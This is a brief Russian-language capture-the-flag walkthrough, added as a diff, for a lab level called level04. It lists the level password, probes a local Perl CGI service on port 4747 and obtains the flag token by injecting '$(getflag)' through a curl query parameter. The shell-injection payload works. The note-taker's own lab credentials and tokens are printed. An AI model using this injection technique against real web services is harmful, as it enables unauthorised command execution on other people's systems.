@@ -1,0 +1,17 @@
+su level04
+pass: qi0maab88jeaj46qoumi7maus
+
+ls
+
+./level04.pl
+
+Из скрипта видим что используется порт 4747, смотрим что на нем происходит
+curl -v localhost:4747
+
+Видим, что он ожидает запрос
+Content-type: text/html
+
+передаем
+curl '127.0.0.1:4747/level04.pl?x=$(getflag)'
+
+Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
